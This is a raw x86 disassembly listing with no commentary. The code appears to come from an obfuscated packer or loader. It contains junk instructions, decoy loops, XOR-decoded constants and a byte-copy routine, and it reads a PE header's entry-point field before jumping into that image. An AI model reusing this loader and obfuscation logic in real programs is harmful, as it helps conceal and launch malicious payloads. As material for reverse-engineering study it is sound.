  419354:	mov    esi,DWORD PTR [ebp+0xc]
  419357:	cmp    esi,eax
  419359:	jne    0x419375
  41935f:	mov    eax,DWORD PTR [ebp-0x4]
  419362:	mov    esi,DWORD PTR [ebp-0x8]
  419365:	xor    eax,edx
  419367:	xor    esi,edx
  419369:	add    eax,ecx
  41936b:	add    esi,ecx
  41936d:	imul   eax,esi
  419370:	jmp    0x4193b0
  419375:	mov    eax,DWORD PTR [ebp+0xc]
  419378:	mov    eax,DWORD PTR [eax+0x78]
  41937b:	mov    DWORD PTR [ebp+0xc],eax
  41937e:	mov    eax,DWORD PTR [ebp-0x4]
  419381:	mov    esi,DWORD PTR [ebp-0x8]
  419384:	xor    eax,edx
  419386:	xor    esi,edx
  419388:	add    eax,ecx
  41938a:	add    esi,ecx
  41938c:	imul   eax,esi
  41938f:	mov    esi,DWORD PTR [ebp+0xc]
  419392:	cmp    esi,eax
  419394:	mov    eax,DWORD PTR [ebp-0x4]
  419397:	je     0x419362
  41939d:	xor    eax,edx
  41939f:	add    eax,ecx
  4193a1:	mov    ecx,DWORD PTR [ebp+0xc]
  4193a4:	imul   eax,ecx
  4193a7:	add    eax,DWORD PTR [ebp+0x8]
  4193aa:	mov    DWORD PTR [ebp+0xc],eax
  4193ad:	mov    eax,DWORD PTR [ebp+0xc]
  4193b0:	pop    esi
  4193b1:	leave  
  4193b2:	ret    0x8
  4193b5:	push   ebp
  4193b6:	mov    ebp,esp
  4193b8:	sub    esp,0x80
  4193be:	push   ebx
  4193bf:	push   esi
  4193c0:	push   edi
  4193c1:	mov    DWORD PTR ds:0x42c010,0xf9a
  4193cb:	mov    DWORD PTR [ebp-0x3c],0x0
  4193d2:	dec    eax
  4193d3:	mov    eax,DWORD PTR [ebp-0x18]
  4193d6:	mov    DWORD PTR [ebp-0x18],eax
  4193d9:	adc    DWORD PTR ds:0x429014,0x42801c
  4193e3:	push   0x421a36
  4193e8:	call   DWORD PTR ds:0x42402c
  4193ee:	adc    DWORD PTR ds:0x428018,0x3fb
  4193f8:	push   0x0
  4193fa:	push   0x67
  4193fc:	sbb    DWORD PTR ds:0x42b008,0x4024
  419406:	push   0xc
  419408:	mov    DWORD PTR ds:0x429000,0x5718
  419412:	push   0x3
  419414:	and    DWORD PTR ds:0x42b004,0x67ab
  41941e:	push   0x2
  419420:	push   0x78769798
  419425:	or     DWORD PTR ds:0x428024,0x42c014
  41942f:	call   DWORD PTR ds:0x42400c
  419435:	or     DWORD PTR ds:0x42c000,0x429014
  41943f:	push   0x57658733
  419444:	and    DWORD PTR ds:0x42c000,0x42900c
  41944e:	call   DWORD PTR ds:0x424008
  419454:	push   0x97667654
  419459:	call   DWORD PTR ds:0x424000
  41945f:	movzx  ebx,BYTE PTR ds:0x428004
  419466:	mov    eax,DWORD PTR [ebp-0x18]
  419469:	mov    ebx,0xf89c85b6
  41946e:	mov    DWORD PTR ds:0x42c018,0x6f46
  419478:	cmp    eax,ebx
  41947a:	mov    DWORD PTR ds:0x42c010,0x6381
  419484:	jne    0x4194d6
  41948a:	mov    DWORD PTR ds:0x421a32,0xf89c85b5
  419494:	adc    DWORD PTR ds:0x42a000,0x42801c
  41949e:	push   DWORD PTR [ebp+0x10]
  4194a1:	and    DWORD PTR ds:0x42a00c,0x42c00c
  4194ab:	push   DWORD PTR [ebp+0xc]
  4194ae:	push   DWORD PTR [ebp+0x8]
  4194b1:	or     DWORD PTR ds:0x42b008,0x5d49
  4194bb:	call   0x419233
  4194c0:	xor    DWORD PTR ds:0x42b018,ebx
  4194c6:	mov    ecx,DWORD PTR ds:0x421922
  4194cc:	or     esi,edi
  4194ce:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4194d4:	mov    DWORD PTR [ecx],eax
  4194d6:	mov    DWORD PTR [ebp-0x4],ebx
  4194d9:	sub    ecx,0x68bb
  4194df:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4194e6:	lea    eax,[ebp-0x44]
  4194e9:	mov    DWORD PTR [ebp-0x3c],eax
  4194ec:	adc    ecx,esi
  4194ee:	lea    eax,[ebp-0x48]
  4194f1:	not    DWORD PTR ds:0x42b008
  4194f7:	mov    DWORD PTR [ebp-0x24],eax
  4194fa:	mov    ecx,DWORD PTR ds:0x4237f9
  419500:	mov    esi,DWORD PTR ds:0x42175a
  419506:	sub    esi,ecx
  419508:	and    ecx,DWORD PTR [ecx+esi*1]
  41950b:	mov    eax,ds:0x421922
  419510:	mov    eax,DWORD PTR [eax+0x1c8]
  419516:	mov    eax,DWORD PTR [eax]
  419518:	and    edi,0x1f5e
  41951e:	mov    ecx,DWORD PTR [ebp-0x24]
  419521:	mov    esi,0x7510893
  419526:	xor    eax,esi
  419528:	mov    edi,0x3272db
  41952d:	add    eax,edi
  41952f:	mov    DWORD PTR ds:0x42b00c,0x7d8f
  419539:	mov    DWORD PTR [ecx],eax
  41953b:	mov    DWORD PTR ds:0x42a01c,0x3f3b
  419545:	mov    eax,ds:0x421b3e
  41954a:	mov    DWORD PTR ds:0x42b000,0x7292
  419554:	cmp    eax,0x301ac8f5
  419559:	mov    DWORD PTR ds:0x42a000,0x7d07
  419563:	jne    0x419756
  419569:	or     DWORD PTR ds:0x42a00c,0x42c008
  419573:	mov    eax,DWORD PTR [ebp-0x4]
  419576:	mov    DWORD PTR ds:0x42b008,0x18
  419580:	cmp    DWORD PTR ds:0x42b008,0x0
  419587:	je     0x4195f4
  41958d:	cmp    DWORD PTR ds:0x42b008,0x7
  419594:	jne    0x4195c4
  41959a:	push   0x42b018
  41959f:	push   0x1cad
  4195a4:	push   0x4fac
  4195a9:	push   0x428000
  4195ae:	push   0x3aa1
  4195b3:	push   0x42352e
  4195b8:	push   DWORD PTR [ebp-0x10]
  4195bb:	push   DWORD PTR [ebp-0x14]
  4195be:	call   DWORD PTR ds:0x424024
  4195c4:	cmp    DWORD PTR ds:0x42b008,0x8
  4195cb:	jne    0x4195de
  4195d1:	mov    edx,DWORD PTR ds:0x42b008
  4195d7:	dec    edx
  4195d8:	mov    DWORD PTR ds:0x42b008,edx
  4195de:	xor    edx,edx
  4195e0:	or     edx,DWORD PTR ds:0x42b008
  4195e6:	dec    edx
  4195e7:	mov    DWORD PTR ds:0x42b008,edx
  4195ed:	jmp    0x419580
  4195f2:	sbb    ecx,ecx
  4195f4:	mov    ecx,DWORD PTR ds:0x421922
  4195fa:	and    DWORD PTR ds:0x42c004,0xdaf
  419604:	mov    ecx,DWORD PTR [ecx+0x198]
  41960a:	movzx  edx,WORD PTR ds:0x42c014
  419611:	add    DWORD PTR ds:0x42b018,edx
  419617:	xor    eax,esi
  419619:	add    eax,edi
  41961b:	and    DWORD PTR ds:0x42801c,0x0
  419625:	xor    edx,edx
  419627:	or     edx,DWORD PTR ds:0x42801c
  41962d:	inc    edx
  41962e:	mov    DWORD PTR ds:0x42801c,edx
  419634:	cmp    DWORD PTR ds:0x42801c,0x8
  41963b:	jne    0x419654
  419641:	push   0x4705
  419646:	push   0x5b08
  41964b:	push   DWORD PTR [ebp-0x18]
  41964e:	call   DWORD PTR ds:0x424028
  419654:	cmp    DWORD PTR ds:0x42801c,0x7
  41965b:	jne    0x41966e
  419661:	mov    edx,DWORD PTR ds:0x42801c
  419667:	inc    edx
  419668:	mov    DWORD PTR ds:0x42801c,edx
  41966e:	cmp    DWORD PTR ds:0x42801c,0x18
  419675:	jb     0x419625
  41967b:	mov    edx,DWORD PTR ds:0x421752
  419681:	mov    edx,DWORD PTR [edx]
  419683:	and    DWORD PTR ds:0x42b000,edx
  419689:	mov    DWORD PTR [ecx],eax
  41968b:	adc    ecx,eax
  41968d:	mov    eax,DWORD PTR [ebp-0x4]
  419690:	xor    eax,esi
  419692:	mov    DWORD PTR ds:0x42a004,0x12
  41969c:	cmp    DWORD PTR ds:0x42a004,0x0
  4196a3:	je     0x4196fe
  4196a9:	cmp    DWORD PTR ds:0x42a004,0x4
  4196b0:	jne    0x4196c6
  4196b6:	push   0x423654
  4196bb:	push   0x4235cf
  4196c0:	call   DWORD PTR ds:0x424030
  4196c6:	cmp    DWORD PTR ds:0x42a004,0x5
  4196cd:	jne    0x4196e2
  4196d3:	xor    edx,edx
  4196d5:	add    edx,DWORD PTR ds:0x42a004
  4196db:	dec    edx
  4196dc:	mov    DWORD PTR ds:0x42a004,edx
  4196e2:	mov    edx,DWORD PTR ds:0x42a004
  4196e8:	dec    edx
  4196e9:	mov    DWORD PTR ds:0x42a004,edx
  4196ef:	jmp    0x41969c
  4196f4:	or     DWORD PTR ds:0x42b000,0x2eb5
  4196fe:	add    eax,edi
  419700:	and    DWORD PTR ds:0x428000,0x0
  41970a:	xor    ecx,ecx
  41970c:	or     ecx,DWORD PTR ds:0x428000
  419712:	inc    ecx
  419713:	mov    DWORD PTR ds:0x428000,ecx
  419719:	cmp    DWORD PTR ds:0x428000,0x26
  419720:	jne    0x419744
  419726:	push   DWORD PTR [ebp-0x1c]
  419729:	push   0x2787
  41972e:	push   DWORD PTR [ebp-0x20]
  419731:	push   DWORD PTR [ebp-0xc]
  419734:	push   0x458b
  419739:	push   0x42a000
  41973e:	call   DWORD PTR ds:0x424038
  419744:	cmp    DWORD PTR ds:0x428000,0x1e
  41974b:	jb     0x41970a
  419751:	mov    ds:0x421b3e,eax
  419756:	and    DWORD PTR ds:0x42a004,0x0
  419760:	xor    ecx,ecx
  419762:	xor    ecx,DWORD PTR ds:0x42a004
  419768:	inc    ecx
  419769:	mov    DWORD PTR ds:0x42a004,ecx
  41976f:	cmp    DWORD PTR ds:0x42a004,0x7
  419776:	jne    0x41978c
  41977c:	push   0x429018
  419781:	push   0x457c
  419786:	call   DWORD PTR ds:0x42403c
  41978c:	cmp    DWORD PTR ds:0x42a004,0x6
  419793:	jne    0x4197a6
  419799:	mov    ecx,DWORD PTR ds:0x42a004
  41979f:	inc    ecx
  4197a0:	mov    DWORD PTR ds:0x42a004,ecx
  4197a6:	cmp    DWORD PTR ds:0x42a004,0x1c
  4197ad:	jb     0x419760
  4197b3:	adc    edx,ecx
  4197b5:	mov    eax,ds:0x421922
  4197ba:	mov    eax,DWORD PTR [eax+0x18c]
  4197c0:	mov    eax,DWORD PTR [eax]
  4197c2:	mov    DWORD PTR [ebp-0x4c],eax
  4197c5:	xor    edx,edx
  4197c7:	add    edx,DWORD PTR ds:0x423809
  4197cd:	mov    eax,ds:0x42174e
  4197d2:	sub    eax,edx
  4197d4:	add    edx,DWORD PTR [edx+eax*1]
  4197d7:	mov    ecx,0xf89c85ba
  4197dc:	not    DWORD PTR ds:0x42b018
  4197e2:	mov    DWORD PTR [ebp-0x38],ecx
  4197e5:	mov    DWORD PTR [ebp-0x38],ecx
  4197e8:	neg    eax
  4197ea:	mov    DWORD PTR [ebp-0x38],ecx
  4197ed:	sbb    DWORD PTR ds:0x42a01c,0x6a2c
  4197f7:	mov    DWORD PTR [ebp-0x30],ebx
  4197fa:	sbb    ebx,ebx
  4197fc:	mov    DWORD PTR [ebp-0x38],ecx
  4197ff:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  419806:	and    DWORD PTR ds:0x42800c,0x0
  419810:	jmp    0x419822
  419815:	mov    edx,DWORD PTR ds:0x42800c
  41981b:	inc    edx
  41981c:	mov    DWORD PTR ds:0x42800c,edx
  419822:	cmp    DWORD PTR ds:0x42800c,0x1c
  419829:	jae    0x419869
  41982f:	cmp    DWORD PTR ds:0x42800c,0x10
  419836:	jne    0x41984a
  41983c:	push   DWORD PTR [ebp-0x20]
  41983f:	push   0x42364a
  419844:	call   DWORD PTR ds:0x424040
  41984a:	cmp    DWORD PTR ds:0x42800c,0xf
  419851:	jne    0x419864
  419857:	mov    edx,DWORD PTR ds:0x42800c
  41985d:	inc    edx
  41985e:	mov    DWORD PTR ds:0x42800c,edx
  419864:	jmp    0x419815
  419869:	mov    eax,DWORD PTR [ebp-0x4]
  41986c:	mov    edx,DWORD PTR [ebp-0x8]
  41986f:	inc    ebx
  419870:	mov    ebx,DWORD PTR [ebp-0x8]
  419873:	sub    DWORD PTR ds:0x42b008,0x42800c
  41987d:	xor    ebx,esi
  41987f:	xor    edx,esi
  419881:	and    DWORD PTR ds:0x42a010,0x42b01c
  41988b:	add    edx,ebx
  41988d:	and    DWORD PTR ds:0x42a01c,0x0
  419897:	jmp    0x4198ab
  41989c:	xor    ebx,ebx
  41989e:	add    ebx,DWORD PTR ds:0x42a01c
  4198a4:	inc    ebx
  4198a5:	mov    DWORD PTR ds:0x42a01c,ebx
  4198ab:	cmp    DWORD PTR ds:0x42a01c,0x12
  4198b2:	jae    0x4198fd
  4198b8:	cmp    DWORD PTR ds:0x42a01c,0x8
  4198bf:	jne    0x4198d0
  4198c5:	push   0x4235b4
  4198ca:	call   DWORD PTR ds:0x424044
  4198d0:	cmp    DWORD PTR ds:0x42a01c,0x7
  4198d7:	jne    0x4198ea
  4198dd:	mov    ebx,DWORD PTR ds:0x42a01c
  4198e3:	inc    ebx
  4198e4:	mov    DWORD PTR ds:0x42a01c,ebx
  4198ea:	jmp    0x41989c
  4198ef:	xor    ebx,ebx
  4198f1:	xor    ebx,DWORD PTR ds:0x42900c
  4198f7:	add    DWORD PTR ds:0x429000,ebx
  4198fd:	mov    ebx,DWORD PTR [ebp-0x8]
  419900:	sub    DWORD PTR ds:0x42900c,0x42800c
  41990a:	xor    ebx,esi
  41990c:	or     DWORD PTR ds:0x428000,0x42a00c
  419916:	xor    eax,esi
  419918:	add    eax,edi
  41991a:	mov    DWORD PTR ds:0x42b01c,0x7433
  419924:	lea    edx,[edx+ebx*1+0x975891]
  41992b:	mov    ebx,0x12a1
  419930:	mov    DWORD PTR [ebp-0x14],eax
  419933:	mov    ebx,0x8a29a123
  419938:	cmp    eax,edx
  41993a:	ja     0x419b96
  419940:	or     ecx,0x8d6
  419946:	mov    ecx,DWORD PTR [ebp-0x8]
  419949:	add    DWORD PTR ds:0x428018,ebx
  41994f:	xor    ecx,esi
  419951:	lea    ecx,[ecx+eax*1+0x3272db]
  419958:	add    DWORD PTR ds:0x429018,0x73bd
  419962:	mov    DWORD PTR [ebp-0x10],ecx
  419965:	adc    DWORD PTR ds:0x42c00c,ecx
  41996b:	mov    ecx,DWORD PTR [ebp-0x30]
  41996e:	inc    edx
  41996f:	xor    ecx,esi
  419971:	lea    ecx,[ebp+ecx*1+0x3272e3]
  419978:	xor    edx,edx
  41997a:	add    edx,DWORD PTR ds:0x42172e
  419980:	mov    edx,DWORD PTR [edx]
  419982:	or     DWORD PTR ds:0x42a008,edx
  419988:	mov    DWORD PTR [ebp-0x38],ecx
  41998b:	mov    ecx,DWORD PTR ds:0x421922
  419991:	mov    ecx,DWORD PTR [ecx+0x1bc]
  419997:	mov    DWORD PTR [ebp-0xc],0xf89c85b6
  41999e:	mov    DWORD PTR ds:0x42b01c,0x13
  4199a8:	cmp    DWORD PTR ds:0x42b01c,0x0
  4199af:	je     0x4199ef
  4199b5:	cmp    DWORD PTR ds:0x42b01c,0x20
  4199bc:	jne    0x4199d7
  4199c2:	push   0x32fe
  4199c7:	push   0x42b000
  4199cc:	push   0x4237ae
  4199d1:	call   DWORD PTR ds:0x424048
  4199d7:	mov    edx,DWORD PTR ds:0x42b01c
  4199dd:	dec    edx
  4199de:	mov    DWORD PTR ds:0x42b01c,edx
  4199e4:	jmp    0x4199a8
  4199e9:	dec    DWORD PTR ds:0x428020
  4199ef:	mov    DWORD PTR [ebp-0x34],ecx
  4199f2:	adc    DWORD PTR ds:0x42a004,ebx
  4199f8:	mov    DWORD PTR [ebp-0x20],0xf89c85b5
  4199ff:	adc    edx,edx
  419a01:	mov    ecx,DWORD PTR [ebp-0xc]
  419a04:	mov    edx,DWORD PTR ds:0x428024
  419a0a:	sbb    DWORD PTR ds:0x42c018,edx
  419a10:	mov    edx,DWORD PTR [ebp-0x10]
  419a13:	xor    ecx,esi
  419a15:	sbb    DWORD PTR ds:0x42b014,0x42b008
  419a1f:	add    ecx,edi
  419a21:	cmp    ecx,edx
  419a23:	mov    DWORD PTR ds:0x429004,0x1818
  419a2d:	je     0x419b62
  419a33:	mov    eax,DWORD PTR [ebp-0xc]
  419a36:	mov    DWORD PTR ds:0x428024,0x1374
  419a40:	mov    ecx,DWORD PTR [ebp-0x10]
  419a43:	xor    edx,edx
  419a45:	or     DWORD PTR ds:0x428008,0x428020
  419a4f:	xor    eax,esi
  419a51:	sub    DWORD PTR ds:0x42b004,0x42a008
  419a5b:	add    eax,edi
  419a5d:	sbb    DWORD PTR ds:0x42c018,0x42c014
  419a67:	add    ecx,0xfabdbef1
  419a6d:	adc    edx,0xffffffff
  419a70:	xor    ecx,ebx
  419a72:	sbb    DWORD PTR ds:0x42a010,0x42800c
  419a7c:	xor    edx,0x0
  419a7f:	mov    DWORD PTR [ebp-0x68],ecx
  419a82:	mov    ecx,DWORD PTR ds:0x42c014
  419a88:	or     DWORD PTR ds:0x42a008,ecx
  419a8e:	mov    DWORD PTR [ebp-0x64],edx
  419a91:	xor    edx,edx
  419a93:	mov    ecx,eax
  419a95:	add    ecx,0xfabdbef1
  419a9b:	adc    edx,0xffffffff
  419a9e:	xor    ecx,ebx
  419aa0:	xor    edx,0x0
  419aa3:	mov    DWORD PTR ds:0x42b008,0x242f
  419aad:	mov    DWORD PTR [ebp-0x24],eax
  419ab0:	mov    DWORD PTR ds:0x428018,0x30e6
  419aba:	mov    DWORD PTR [ebp-0x74],edx
  419abd:	mov    DWORD PTR ds:0x428018,0xdc5
  419ac7:	cmp    ecx,DWORD PTR [ebp-0x68]
  419aca:	jne    0x419ae5
  419ad0:	mov    ecx,DWORD PTR [ebp-0x64]
  419ad3:	cmp    edx,ecx
  419ad5:	mov    DWORD PTR ds:0x429004,0x231e
  419adf:	je     0x419b5f
  419ae5:	mov    ecx,DWORD PTR [ebp-0xc]
  419ae8:	mov    edx,DWORD PTR [ebp-0x20]
  419aeb:	xor    edx,esi
  419aed:	add    edx,edi
  419aef:	imul   edx,eax
  419af2:	xor    ecx,esi
  419af4:	add    ecx,eax
  419af6:	mov    eax,DWORD PTR [ebp-0x34]
  419af9:	mov    ebx,DWORD PTR [ebp-0x38]
  419afc:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  419b03:	mov    BYTE PTR [edx+eax*1],cl
  419b06:	mov    eax,DWORD PTR [ebp-0x20]
  419b09:	mov    ecx,DWORD PTR [ebp-0x24]
  419b0c:	xor    eax,esi
  419b0e:	lea    eax,[ecx+eax*1+0x3272db]
  419b15:	mov    ecx,DWORD PTR [ebp-0x10]
  419b18:	xor    edx,edx
  419b1a:	add    ecx,0xfabdbef1
  419b20:	adc    edx,0xffffffff
  419b23:	xor    edx,0x0
  419b26:	mov    ebx,0x8a29a123
  419b2b:	xor    ecx,ebx
  419b2d:	mov    DWORD PTR [ebp-0x70],ecx
  419b30:	mov    DWORD PTR [ebp-0x6c],edx
  419b33:	xor    edx,edx
  419b35:	mov    ecx,eax
  419b37:	add    ecx,0xfabdbef1
  419b3d:	adc    edx,0xffffffff
  419b40:	xor    ecx,ebx
  419b42:	xor    edx,0x0
  419b45:	mov    DWORD PTR [ebp-0x24],eax
  419b48:	mov    DWORD PTR [ebp-0x7c],edx
  419b4b:	cmp    ecx,DWORD PTR [ebp-0x70]
  419b4e:	jne    0x419ae5
  419b54:	mov    ecx,DWORD PTR [ebp-0x6c]
  419b57:	cmp    edx,ecx
  419b59:	jne    0x419ae5
  419b5f:	mov    eax,DWORD PTR [ebp-0x14]
  419b62:	mov    ecx,DWORD PTR [ebp-0x8]
  419b65:	xor    ecx,esi
  419b67:	lea    eax,[eax+ecx*1+0x3272db]
  419b6e:	mov    ecx,DWORD PTR [ebp-0x8]
  419b71:	mov    edx,DWORD PTR [ebp-0x8]
  419b74:	xor    edx,esi
  419b76:	xor    ecx,esi
  419b78:	add    ecx,edx
  419b7a:	mov    edx,DWORD PTR [ebp-0x8]
  419b7d:	xor    edx,esi
  419b7f:	lea    ecx,[ecx+edx*1+0x975891]
  419b86:	mov    DWORD PTR [ebp-0x14],eax
  419b89:	cmp    eax,ecx
  419b8b:	jbe    0x419940
  419b91:	mov    ecx,0xf89c85ba
  419b96:	mov    eax,DWORD PTR [ebp+0xc]
  419b99:	mov    ds:0x4217a6,eax
  419b9e:	mov    eax,DWORD PTR [ebp+0x10]
  419ba1:	mov    ds:0x4219fa,eax
  419ba6:	mov    eax,ds:0x4217a6
  419bab:	mov    edx,DWORD PTR [ebp-0x3c]
  419bae:	sub    eax,edi
  419bb0:	xor    eax,esi
  419bb2:	mov    DWORD PTR [edx],eax
  419bb4:	mov    eax,DWORD PTR [ebp-0x18]
  419bb7:	cmp    eax,0xf89c85b6
  419bbc:	jne    0x419be7
  419bc2:	lea    eax,[ebp-0x28]
  419bc5:	mov    DWORD PTR [ebp-0x40],eax
  419bc8:	lea    eax,[ebp+0x4]
  419bcb:	mov    DWORD PTR [ebp-0x28],eax
  419bce:	mov    eax,DWORD PTR [ebp-0x28]
  419bd1:	test   eax,eax
  419bd3:	je     0x419cff
  419bd9:	mov    eax,DWORD PTR [ebp-0x1c]
  419bdc:	mov    eax,DWORD PTR [ebp-0x8]
  419bdf:	lea    eax,[ebp-0x40]
  419be2:	jmp    0x419cf6
  419be7:	mov    eax,DWORD PTR [ebp-0x44]
  419bea:	cmp    eax,0xf89c85b5
  419bef:	je     0x419c4c
  419bf5:	mov    eax,DWORD PTR [ebp-0x4]
  419bf8:	mov    edx,DWORD PTR [ebp-0x48]
  419bfb:	xor    eax,esi
  419bfd:	add    eax,edi
  419bff:	cmp    eax,edx
  419c01:	je     0x419c4c
  419c07:	mov    eax,ds:0x421922
  419c0c:	mov    eax,DWORD PTR [eax+0x194]
  419c12:	mov    ecx,DWORD PTR [eax]
  419c14:	mov    eax,DWORD PTR [ecx+0x3c]
  419c17:	push   DWORD PTR ds:0x4219fa
  419c1d:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  419c21:	push   DWORD PTR ds:0x4217a6
  419c27:	add    eax,ecx
  419c29:	mov    ecx,DWORD PTR ds:0x421922
  419c2f:	mov    ecx,DWORD PTR [ecx+0x194]
  419c35:	push   DWORD PTR [ecx]
  419c37:	call   eax
  419c39:	mov    ecx,DWORD PTR ds:0x421922
  419c3f:	mov    ecx,DWORD PTR [ecx+0x1cc]
  419c45:	mov    DWORD PTR [ecx],eax
  419c47:	jmp    0x419cff
  419c4c:	mov    eax,DWORD PTR [ebp-0x4]
  419c4f:	mov    edx,DWORD PTR [ebp-0x4c]
  419c52:	xor    eax,esi
  419c54:	add    eax,edi
  419c56:	cmp    eax,edx
  419c58:	jne    0x419cb5
  419c5e:	mov    eax,DWORD PTR [ebp-0x4]
  419c61:	mov    edx,DWORD PTR ds:0x421922
  419c67:	mov    edx,DWORD PTR [edx+0x198]
  419c6d:	xor    eax,esi
  419c6f:	add    eax,edi
  419c71:	cmp    eax,DWORD PTR [edx]
  419c73:	jne    0x419c92
  419c79:	mov    eax,DWORD PTR [ebp-0x4]
  419c7c:	push   0xf89c85b6
  419c81:	xor    eax,esi
  419c83:	add    eax,edi
  419c85:	push   eax
  419c86:	push   ecx
  419c87:	push   DWORD PTR [ebp-0x8]
  419c8a:	push   DWORD PTR [ebp-0x4]
  419c8d:	call   0x408b5c
  419c92:	push   DWORD PTR [ebp-0x8]
  419c95:	push   DWORD PTR [ebp-0x4]
  419c98:	call   0x4091f8
  419c9d:	mov    eax,DWORD PTR [ebp-0x4]
  419ca0:	xor    eax,esi
  419ca2:	add    eax,edi
  419ca4:	mov    ds:0x4219a6,eax
  419ca9:	mov    eax,DWORD PTR [ebp-0x4]
  419cac:	xor    eax,esi
  419cae:	add    eax,edi
  419cb0:	mov    ds:0x42199e,eax
  419cb5:	lea    eax,[ebp-0x2c]
  419cb8:	mov    DWORD PTR [ebp-0x50],eax
  419cbb:	lea    eax,[ebp+0x4]
  419cbe:	mov    DWORD PTR [ebp-0x2c],eax
  419cc1:	mov    eax,DWORD PTR [ebp-0x2c]
  419cc4:	test   eax,eax
  419cc6:	je     0x419cff
  419ccc:	mov    DWORD PTR [ebp-0x54],0xf152c3d
  419cd3:	mov    DWORD PTR [ebp-0x58],0x712ed08
  419cda:	mov    DWORD PTR [ebp-0x5c],0x373fc2e
  419ce1:	mov    DWORD PTR [ebp-0x60],0x72670a1e
  419ce8:	call   0x401000
  419ced:	mov    eax,DWORD PTR [ebp-0x1c]
  419cf0:	mov    eax,DWORD PTR [ebp-0x8]
  419cf3:	lea    eax,[ebp-0x50]
  419cf6:	push   eax
  419cf7:	push   DWORD PTR [ebp-0x4]
  419cfa:	call   0x40883f
  419cff:	mov    eax,ds:0x421922
  419d04:	add    eax,0x1cc
  419d09:	mov    DWORD PTR [ebp-0x38],eax
  419d0c:	lea    eax,[ebp-0x1c]
  419d0f:	mov    DWORD PTR [ebp+0xc],0xf89c85b6
  419d16:	mov    DWORD PTR [ebp-0x3c],eax
  419d19:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  419d20:	mov    eax,DWORD PTR [ebp+0xc]
  419d23:	xor    eax,esi
  419d25:	mov    DWORD PTR [ebp+0x10],0x4
  419d2c:	mov    ecx,DWORD PTR [ebp+0x10]
  419d2f:	add    eax,edi
  419d31:	cmp    eax,ecx
  419d33:	je     0x419df4
  419d39:	mov    eax,DWORD PTR [ebp+0xc]
  419d3c:	mov    ecx,DWORD PTR [ebp+0x10]
  419d3f:	xor    edx,edx
  419d41:	xor    eax,esi
  419d43:	add    eax,edi
  419d45:	add    ecx,0xfabdbef1
  419d4b:	adc    edx,0xffffffff
  419d4e:	xor    ecx,ebx
  419d50:	xor    edx,0x0
  419d53:	mov    DWORD PTR [ebp-0x70],ecx
  419d56:	mov    DWORD PTR [ebp-0x6c],edx
  419d59:	xor    edx,edx
  419d5b:	mov    ecx,eax
  419d5d:	add    ecx,0xfabdbef1
  419d63:	adc    edx,0xffffffff
  419d66:	xor    ecx,ebx
  419d68:	xor    edx,0x0
  419d6b:	mov    DWORD PTR [ebp-0x20],eax
  419d6e:	cmp    ecx,DWORD PTR [ebp-0x70]
  419d71:	jne    0x419d80
  419d77:	cmp    edx,DWORD PTR [ebp-0x6c]
  419d7a:	je     0x419df4
  419d80:	mov    ecx,DWORD PTR [ebp+0xc]
  419d83:	mov    edx,DWORD PTR [ebp-0x24]
  419d86:	xor    edx,esi
  419d88:	xor    ecx,esi
  419d8a:	add    ecx,eax
  419d8c:	add    edx,edi
  419d8e:	imul   edx,eax
  419d91:	mov    eax,DWORD PTR [ebp-0x3c]
  419d94:	mov    ebx,DWORD PTR [ebp-0x38]
  419d97:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272db]
  419d9e:	mov    BYTE PTR [edx+eax*1],cl
  419da1:	mov    eax,DWORD PTR [ebp-0x24]
  419da4:	mov    ecx,DWORD PTR [ebp-0x20]
  419da7:	mov    edx,DWORD PTR [ebp+0x10]
  419daa:	xor    eax,esi
  419dac:	lea    eax,[ecx+eax*1+0x3272db]
  419db3:	xor    ecx,ecx
  419db5:	add    edx,0xfabdbef1
  419dbb:	adc    ecx,0xffffffff
  419dbe:	xor    ecx,0x0
  419dc1:	mov    DWORD PTR [ebp-0x7c],ecx
  419dc4:	xor    ebx,ebx
  419dc6:	xor    edx,0x8a29a123
  419dcc:	mov    ecx,eax
  419dce:	add    ecx,0xfabdbef1
  419dd4:	adc    ebx,0xffffffff
  419dd7:	xor    ecx,0x8a29a123
  419ddd:	xor    ebx,0x0
  419de0:	mov    DWORD PTR [ebp-0x20],eax
  419de3:	cmp    ecx,edx
  419de5:	jne    0x419d80
  419deb:	cmp    ebx,DWORD PTR [ebp-0x7c]
  419dee:	jne    0x419d80
  419df4:	mov    eax,DWORD PTR [ebp-0x1c]
  419df7:	mov    eax,DWORD PTR [eax]
  419df9:	pop    edi
  419dfa:	pop    esi
  419dfb:	pop    ebx
  419dfc:	leave  
  419dfd:	ret    0xc
  419e00:	push   ebp
  419e01:	mov    ebp,esp
  419e03:	sub    esp,0xa4
  419e09:	mov    DWORD PTR ds:0x42b000,0x1b
  419e13:	cmp    DWORD PTR ds:0x42b000,0x0
  419e1a:	je     0x419e69
  419e20:	cmp    DWORD PTR ds:0x42b000,0x4
  419e27:	jne    0x419e3b
  419e2d:	push   0x428000
  419e32:	push   DWORD PTR [ebp-0xc]
  419e35:	call   DWORD PTR ds:0x424014
  419e3b:	cmp    DWORD PTR ds:0x42b000,0x5
  419e42:	jne    0x419e57
  419e48:	xor    ecx,ecx
  419e4a:	xor    ecx,DWORD PTR ds:0x42b000
  419e50:	dec    ecx
  419e51:	mov    DWORD PTR ds:0x42b000,ecx
  419e57:	mov    ecx,DWORD PTR ds:0x42b000
  419e5d:	dec    ecx
  419e5e:	mov    DWORD PTR ds:0x42b000,ecx
  419e64:	jmp    0x419e13
  419e69:	mov    ecx,DWORD PTR [ebp+0x8]
  419e6c:	add    DWORD PTR ds:0x429004,0x326a
  419e76:	mov    eax,0x8a85
  419e7b:	sbb    DWORD PTR ds:0x42c014,0x42a000
  419e85:	xor    ax,WORD PTR [ecx+0x20]
  419e89:	sbb    ecx,DWORD PTR ds:0x42c008
  419e8f:	mov    ecx,0x3b4b
  419e94:	add    ax,cx
  419e97:	not    ecx
  419e99:	movzx  eax,ax
  419e9c:	mov    DWORD PTR [ebp-0x18],eax
  419e9f:	mov    BYTE PTR [ebp-0x1],0x61
  419ea3:	sub    DWORD PTR ds:0x429018,edi
  419ea9:	lea    eax,[ebp-0x1]
  419eac:	mov    DWORD PTR [ebp-0x10],eax
  419eaf:	mov    al,BYTE PTR [ebp-0x1]
  419eb2:	mov    DWORD PTR ds:0x42b018,0x13
  419ebc:	cmp    DWORD PTR ds:0x42b018,0x0
